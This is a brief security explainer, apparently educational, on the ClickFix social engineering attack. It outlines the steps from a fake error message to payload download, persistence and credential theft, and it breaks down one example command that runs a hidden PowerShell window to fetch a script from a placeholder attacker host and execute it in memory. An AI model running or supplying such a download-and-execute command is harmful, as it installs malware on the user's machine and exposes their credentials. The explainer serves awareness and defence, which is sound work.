Clickfix is a social engineering attack, where the attacker tricks the users into:
  - Copying a command
  - Pasting it into Run/Powershell/CMD
  - Executing it Manually

Attack Flow:

Phishing Email / Web Page
        ↓
Fake Error Message ("Fix required")
        ↓
Copy Command Button
        ↓
User opens Run / PowerShell
        ↓
Paste & Execute
        ↓
Payload Download
        ↓
Loader Execution
        ↓
Persistence
        ↓
C2 Communication
        ↓
Credential Theft / Lateral Movement

Command Breakdown:
  powershell -w hidden -c "iwr hxxp://evil.site/a.ps1 | iex"

| Part         | Meaning                           |             |
| ------------ | --------------------------------- | ----------- |
| `powershell` | Launch PowerShell                 |             |
| `-w hidden`  | Hidden window (stealth)           |             |
| `-c`         | Execute command                   |             |
| `iwr`        | Download file (Invoke-WebRequest) |             |
| `            | `                                 | Pipe output |
| `iex`        | Execute downloaded content        |             |

So:
  Download + Execute in Memory (Fileless attack)

